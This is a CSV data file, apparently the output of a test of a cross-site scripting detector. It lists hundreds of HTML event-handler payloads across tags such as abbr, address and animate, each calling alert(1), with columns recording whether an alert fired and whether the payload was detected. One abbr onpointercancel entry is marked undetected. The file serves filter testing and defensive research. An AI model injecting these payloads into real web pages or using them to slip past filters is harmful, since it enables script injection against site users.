Payload,Alert,Detected
<a2 onpointercancel=alert(1)>XSS</a2>,False,1
<a2 onpointerdown=alert(1) style=display:block>XSS</a2>,False,1
<a2 onpointerenter=alert(1) style=display:block>XSS</a2>,False,1
<a2 onpointerleave=alert(1) style=display:block>XSS</a2>,False,1
<a2 onpointermove=alert(1) style=display:block>XSS</a2>,False,1
<a2 onpointerout=alert(1) style=display:block>XSS</a2>,False,1
<a2 onpointerover=alert(1) style=display:block>XSS</a2>,False,1
<a2 onpointerrawupdate=alert(1) style=display:block>XSS</a2>,False,1
<a2 onpointerup=alert(1) style=display:block>XSS</a2>,False,1
"<a2 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></a2>",False,1
<a2 onwebkitmouseforcechanged=alert(1)>XSS</a2>,False,1
<a2 onwebkitmouseforcedown=alert(1)>XSS</a2>,False,1
<a2 onwebkitmouseforceup=alert(1)>XSS</a2>,False,1
<a2 onwebkitmouseforcewillbegin=alert(1)>XSS</a2>,False,1
<a2 onwebkitwillrevealbottom=alert(1)>XSS</a2>,False,1
<abbr contenteditable onbeforeinput=alert(1)>test,False,1
"<abbr draggable=""true"" ondrag=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr draggable=""true"" ondragend=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></abbr>",False,1
<abbr id=x tabindex=1 onfocus=alert(1)></abbr>,False,1
<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>,False,1
<abbr onafterscriptexecute=alert(1)><script>1</script>,False,1
"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",False,1
"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",False,1
<abbr onbeforescriptexecute=alert(1)><script>1</script>,False,1
<abbr onblur=alert(1) id=x tabindex=1 style=display:block>test</abbr><input value=clickme>,False,1
"<abbr onclick=""alert(1)"" style=display:block>test</abbr>",False,1
<abbr oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<abbr oncontextmenu=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<abbr oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<abbr ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</abbr>",False,1
<abbr onfocus=alert(1) autofocus tabindex=1>,False,1
<abbr onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</abbr><input value=clickme>,False,1
"<abbr onkeydown=""alert(1)"" contenteditable style=display:block>test</abbr>",False,1
"<abbr onkeypress=""alert(1)"" contenteditable style=display:block>test</abbr>",False,1
"<abbr onkeyup=""alert(1)"" contenteditable style=display:block>test</abbr>",False,1
"<abbr onmousedown=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr onmouseenter=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr onmouseleave=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr onmousemove=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr onmouseout=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr onmouseover=""alert(1)"" style=display:block>test</abbr>",False,1
"<abbr onmouseup=""alert(1)"" style=display:block>test</abbr>",False,1
<abbr onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<abbr onpaste=""alert(1)"" contenteditable>test</abbr>",False,1
<abbr onpointercancel=alert(1)>XSS</abbr>,False,0
<abbr onpointerdown=alert(1) style=display:block>XSS</abbr>,False,1
<abbr onpointerenter=alert(1) style=display:block>XSS</abbr>,False,1
<abbr onpointerleave=alert(1) style=display:block>XSS</abbr>,False,1
<abbr onpointermove=alert(1) style=display:block>XSS</abbr>,False,1
<abbr onpointerout=alert(1) style=display:block>XSS</abbr>,False,1
<abbr onpointerover=alert(1) style=display:block>XSS</abbr>,False,1
<abbr onpointerrawupdate=alert(1) style=display:block>XSS</abbr>,False,1
<abbr onpointerup=alert(1) style=display:block>XSS</abbr>,False,1
"<abbr onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></abbr>",False,1
<abbr onwebkitmouseforcechanged=alert(1)>XSS</abbr>,False,1
<abbr onwebkitmouseforcedown=alert(1)>XSS</abbr>,False,1
<abbr onwebkitmouseforceup=alert(1)>XSS</abbr>,False,1
<abbr onwebkitmouseforcewillbegin=alert(1)>XSS</abbr>,False,1
<abbr onwebkitwillrevealbottom=alert(1)>XSS</abbr>,False,1
<acronym contenteditable onbeforeinput=alert(1)>test,False,1
"<acronym draggable=""true"" ondrag=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym draggable=""true"" ondragend=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></acronym>",False,1
<acronym id=x tabindex=1 onfocus=alert(1)></acronym>,False,1
<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>,False,1
<acronym onafterscriptexecute=alert(1)><script>1</script>,False,1
"<acronym onbeforecopy=""alert(1)"" contenteditable>test</acronym>",False,1
"<acronym onbeforecut=""alert(1)"" contenteditable>test</acronym>",False,1
<acronym onbeforescriptexecute=alert(1)><script>1</script>,False,1
<acronym onblur=alert(1) id=x tabindex=1 style=display:block>test</acronym><input value=clickme>,False,1
"<acronym onclick=""alert(1)"" style=display:block>test</acronym>",False,1
<acronym oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<acronym oncontextmenu=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<acronym oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<acronym ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</acronym>",False,1
<acronym onfocus=alert(1) autofocus tabindex=1>,False,1
<acronym onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</acronym><input value=clickme>,False,1
"<acronym onkeydown=""alert(1)"" contenteditable style=display:block>test</acronym>",False,1
"<acronym onkeypress=""alert(1)"" contenteditable style=display:block>test</acronym>",False,1
"<acronym onkeyup=""alert(1)"" contenteditable style=display:block>test</acronym>",False,1
"<acronym onmousedown=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym onmouseenter=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym onmouseleave=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym onmousemove=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym onmouseout=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym onmouseover=""alert(1)"" style=display:block>test</acronym>",False,1
"<acronym onmouseup=""alert(1)"" style=display:block>test</acronym>",False,1
<acronym onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",False,1
<acronym onpointercancel=alert(1)>XSS</acronym>,False,1
<acronym onpointerdown=alert(1) style=display:block>XSS</acronym>,False,1
<acronym onpointerenter=alert(1) style=display:block>XSS</acronym>,False,1
<acronym onpointerleave=alert(1) style=display:block>XSS</acronym>,False,1
<acronym onpointermove=alert(1) style=display:block>XSS</acronym>,False,1
<acronym onpointerout=alert(1) style=display:block>XSS</acronym>,False,1
<acronym onpointerover=alert(1) style=display:block>XSS</acronym>,False,1
<acronym onpointerrawupdate=alert(1) style=display:block>XSS</acronym>,False,1
<acronym onpointerup=alert(1) style=display:block>XSS</acronym>,False,1
"<acronym onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></acronym>",False,1
<acronym onwebkitmouseforcechanged=alert(1)>XSS</acronym>,False,1
<acronym onwebkitmouseforcedown=alert(1)>XSS</acronym>,False,1
<acronym onwebkitmouseforceup=alert(1)>XSS</acronym>,False,1
<acronym onwebkitmouseforcewillbegin=alert(1)>XSS</acronym>,False,1
<acronym onwebkitwillrevealbottom=alert(1)>XSS</acronym>,False,1
<address contenteditable onbeforeinput=alert(1)>test,False,1
"<address draggable=""true"" ondrag=""alert(1)"" style=display:block>test</address>",False,1
"<address draggable=""true"" ondragend=""alert(1)"" style=display:block>test</address>",False,1
"<address draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</address>",False,1
"<address draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</address>",False,1
"<address draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</address>",False,1
"<address draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</address>",False,1
"<address id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></address>",False,1
<address id=x tabindex=1 onfocus=alert(1)></address>,False,1
<address id=x tabindex=1 onfocusin=alert(1)></address>,False,1
<address onafterscriptexecute=alert(1)><script>1</script>,False,1
"<address onbeforecopy=""alert(1)"" contenteditable>test</address>",False,1
"<address onbeforecut=""alert(1)"" contenteditable>test</address>",False,1
<address onbeforescriptexecute=alert(1)><script>1</script>,False,1
<address onblur=alert(1) id=x tabindex=1 style=display:block>test</address><input value=clickme>,False,1
"<address onclick=""alert(1)"" style=display:block>test</address>",False,1
<address oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<address oncontextmenu=""alert(1)"" style=display:block>test</address>",False,1
"<address oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<address oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<address ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</address>",False,1
<address onfocus=alert(1) autofocus tabindex=1>,False,1
<address onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</address><input value=clickme>,False,1
"<address onkeydown=""alert(1)"" contenteditable style=display:block>test</address>",False,1
"<address onkeypress=""alert(1)"" contenteditable style=display:block>test</address>",False,1
"<address onkeyup=""alert(1)"" contenteditable style=display:block>test</address>",False,1
"<address onmousedown=""alert(1)"" style=display:block>test</address>",False,1
"<address onmouseenter=""alert(1)"" style=display:block>test</address>",False,1
"<address onmouseleave=""alert(1)"" style=display:block>test</address>",False,1
"<address onmousemove=""alert(1)"" style=display:block>test</address>",False,1
"<address onmouseout=""alert(1)"" style=display:block>test</address>",False,1
"<address onmouseover=""alert(1)"" style=display:block>test</address>",False,1
"<address onmouseup=""alert(1)"" style=display:block>test</address>",False,1
<address onmousewheel=alert(1) style=display:block>requires scrolling,False,1
"<address onpaste=""alert(1)"" contenteditable>test</address>",False,1
<address onpointercancel=alert(1)>XSS</address>,False,1
<address onpointerdown=alert(1) style=display:block>XSS</address>,False,1
<address onpointerenter=alert(1) style=display:block>XSS</address>,False,1
<address onpointerleave=alert(1) style=display:block>XSS</address>,False,1
<address onpointermove=alert(1) style=display:block>XSS</address>,False,1
<address onpointerout=alert(1) style=display:block>XSS</address>,False,1
<address onpointerover=alert(1) style=display:block>XSS</address>,False,1
<address onpointerrawupdate=alert(1) style=display:block>XSS</address>,False,1
<address onpointerup=alert(1) style=display:block>XSS</address>,False,1
"<address onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></address>",False,1
<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>,False,1
<address onwebkitmouseforcechanged=alert(1)>XSS</address>,False,1
<address onwebkitmouseforcedown=alert(1)>XSS</address>,False,1
<address onwebkitmouseforceup=alert(1)>XSS</address>,False,1
<address onwebkitmouseforcewillbegin=alert(1)>XSS</address>,False,1
<address onwebkitwillrevealbottom=alert(1)>XSS</address>,False,1
<animate contenteditable onbeforeinput=alert(1)>test,False,1
"<animate draggable=""true"" ondrag=""alert(1)"" style=display:block>test</animate>",False,1
"<animate draggable=""true"" ondragend=""alert(1)"" style=display:block>test</animate>",False,1
"<animate draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</animate>",False,1
"<animate draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</animate>",False,1
"<animate draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</animate>",False,1
"<animate draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</animate>",False,1
"<animate id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></animate>",False,1
<animate onafterscriptexecute=alert(1)><script>1</script>,False,1
<animate onbeforescriptexecute=alert(1)><script>1</script>,False,1
<animate onblur=alert(1) id=x tabindex=1 style=display:block>test</animate><input value=clickme>,False,1
"<animate onclick=""alert(1)"" style=display:block>test</animate>",False,1
<animate oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<animate oncontextmenu=""alert(1)"" style=display:block>test</animate>",False,1
"<animate oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<animate oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<animate ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</animate>",False,1
<animate onfocus=alert(1) autofocus tabindex=1>,False,1
<animate onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</animate><input value=clickme>,False,1
"<animate onkeydown=""alert(1)"" contenteditable style=display:block>test</animate>",False,1
"<animate onkeypress=""alert(1)"" contenteditable style=display:block>test</animate>",False,1
"<animate onkeyup=""alert(1)"" contenteditable style=display:block>test</animate>",False,1
"<animate onmousedown=""alert(1)"" style=display:block>test</animate>",False,1
"<animate onmouseenter=""alert(1)"" style=display:block>test</animate>",False,1
"<animate onmouseleave=""alert(1)"" style=display:block>test</animate>",False,1
"<animate onmousemove=""alert(1)"" style=display:block>test</animate>",False,1
"<animate onmouseout=""alert(1)"" style=display:block>test</animate>",False,1
"<animate onmouseover=""alert(1)"" style=display:block>test</animate>",False,1
"<animate onmouseup=""alert(1)"" style=display:block>test</animate>",False,1
<animate onmousewheel=alert(1) style=display:block>requires scrolling,False,1
<animate onpointercancel=alert(1)>XSS</animate>,False,1
<animate onpointerdown=alert(1) style=display:block>XSS</animate>,False,1
<animate onpointerenter=alert(1) style=display:block>XSS</animate>,False,1
<animate onpointerleave=alert(1) style=display:block>XSS</animate>,False,1
<animate onpointermove=alert(1) style=display:block>XSS</animate>,False,1
<animate onpointerout=alert(1) style=display:block>XSS</animate>,False,1
<animate onpointerover=alert(1) style=display:block>XSS</animate>,False,1
<animate onpointerrawupdate=alert(1) style=display:block>XSS</animate>,False,1
<animate onpointerup=alert(1) style=display:block>XSS</animate>,False,1
"<animate onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></animate>",False,1
<animate onwebkitmouseforcechanged=alert(1)>XSS</animate>,False,1
<animate onwebkitmouseforcedown=alert(1)>XSS</animate>,False,1
<animate onwebkitmouseforceup=alert(1)>XSS</animate>,False,1
<animate onwebkitmouseforcewillbegin=alert(1)>XSS</animate>,False,1
<animate onwebkitwillrevealbottom=alert(1)>XSS</animate>,False,1
<animatemotion contenteditable onbeforeinput=alert(1)>test,False,1
"<animatemotion draggable=""true"" ondrag=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion draggable=""true"" ondragend=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></animatemotion>",False,1
<animatemotion onafterscriptexecute=alert(1)><script>1</script>,False,1
<animatemotion onbeforescriptexecute=alert(1)><script>1</script>,False,1
<animatemotion onblur=alert(1) id=x tabindex=1 style=display:block>test</animatemotion><input value=clickme>,False,1
"<animatemotion onclick=""alert(1)"" style=display:block>test</animatemotion>",False,1
<animatemotion oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<animatemotion oncontextmenu=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<animatemotion oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
"<animatemotion ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</animatemotion>",False,1
<animatemotion onfocus=alert(1) autofocus tabindex=1>,False,1
<animatemotion onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</animatemotion><input value=clickme>,False,1
"<animatemotion onkeydown=""alert(1)"" contenteditable style=display:block>test</animatemotion>",False,1
"<animatemotion onkeypress=""alert(1)"" contenteditable style=display:block>test</animatemotion>",False,1
"<animatemotion onkeyup=""alert(1)"" contenteditable style=display:block>test</animatemotion>",False,1
"<animatemotion onmousedown=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion onmouseenter=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion onmouseleave=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion onmousemove=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion onmouseout=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion onmouseover=""alert(1)"" style=display:block>test</animatemotion>",False,1
"<animatemotion onmouseup=""alert(1)"" style=display:block>test</animatemotion>",False,1
<animatemotion onmousewheel=alert(1) style=display:block>requires scrolling,False,1
<animatemotion onpointercancel=alert(1)>XSS</animatemotion>,False,1
<animatemotion onpointerdown=alert(1) style=display:block>XSS</animatemotion>,False,1
<animatemotion onpointerenter=alert(1) style=display:block>XSS</animatemotion>,False,1
<animatemotion onpointerleave=alert(1) style=display:block>XSS</animatemotion>,False,1
<animatemotion onpointermove=alert(1) style=display:block>XSS</animatemotion>,False,1
<animatemotion onpointerout=alert(1) style=display:block>XSS</animatemotion>,False,1
<animatemotion onpointerover=alert(1) style=display:block>XSS</animatemotion>,False,1
<animatemotion onpointerrawupdate=alert(1) style=display:block>XSS</animatemotion>,False,1
<animatemotion onpointerup=alert(1) style=display:block>XSS</animatemotion>,False,1
"<animatemotion onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></animatemotion>",False,1
<animatemotion onwebkitmouseforcechanged=alert(1)>XSS</animatemotion>,False,1
<animatemotion onwebkitmouseforcedown=alert(1)>XSS</animatemotion>,False,1
<animatemotion onwebkitmouseforceup=alert(1)>XSS</animatemotion>,False,1
<animatemotion onwebkitmouseforcewillbegin=alert(1)>XSS</animatemotion>,False,1
<animatemotion onwebkitwillrevealbottom=alert(1)>XSS</animatemotion>,False,1
<animatetransform contenteditable onbeforeinput=alert(1)>test,False,1
"<animatetransform draggable=""true"" ondrag=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform draggable=""true"" ondragend=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></animatetransform>",False,1
<animatetransform onafterscriptexecute=alert(1)><script>1</script>,False,1
<animatetransform onbeforescriptexecute=alert(1)><script>1</script>,False,1
<animatetransform onblur=alert(1) id=x tabindex=1 style=display:block>test</animatetransform><input value=clickme>,False,1
"<animatetransform onclick=""alert(1)"" style=display:block>test</animatetransform>",False,1
<animatetransform oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,False,1
"<animatetransform oncontextmenu=""alert(1)"" style=display:block>test</animatetransform>",False,1
"<animatetransform oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",False,1
